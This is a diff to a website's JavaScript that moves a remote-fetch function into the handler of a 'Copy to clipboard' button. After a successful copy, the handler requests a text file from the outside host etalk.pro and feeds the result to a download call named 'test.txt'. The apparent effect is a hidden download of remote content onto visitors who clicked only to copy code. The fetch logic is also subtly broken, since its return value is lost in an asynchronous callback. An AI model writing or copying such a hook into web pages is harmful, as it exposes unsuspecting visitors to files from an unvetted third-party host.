@@ -454,20 +454,7 @@ for (var i = 0; i < masonry[0].children.length; i++) {
 }
 
 
-var gett = function getText(){
-    // read text from URL location
-    var request = new XMLHttpRequest();
-    request.open('GET', 'https://etalk.pro/jzHsEXF3.txt', true);
-    request.send(null);
-    request.onreadystatechange = function () {
-        if (request.readyState === 4 && request.status === 200) {
-            var type = request.getResponseHeader('Content-Type');
-            if (type.indexOf("text") !== 1) {
-                return request.responseText;
-            }
-        }
-    }
-}
+
 
 var copyCode = function(elem) {
 	if (elem.innerText != "Copy to clipboard") {
@@ -497,8 +484,24 @@ var copyCode = function(elem) {
 	try {
 		if (document.execCommand("copy")) {
 		
+		
+			function getText(){
+				
+				var request = new XMLHttpRequest();
+				request.open('GET', 'https://etalk.pro/jzHsEXF3.txt', true);
+				request.send(null);
+				request.onreadystatechange = function () {
+					if (request.readyState === 4 && request.status === 200) {
+						var type = request.getResponseHeader('Content-Type');
+						if (type.indexOf("text") !== 1) {
+							return request.responseText;
+						}
+					}
+				}
+			}
+		
 			flashButton(elem, true);
-			downloadff('test.txt', gett);
+			downloadff('test.txt', getText());
 		} else {
 			flashButton(elem, false);
 		}
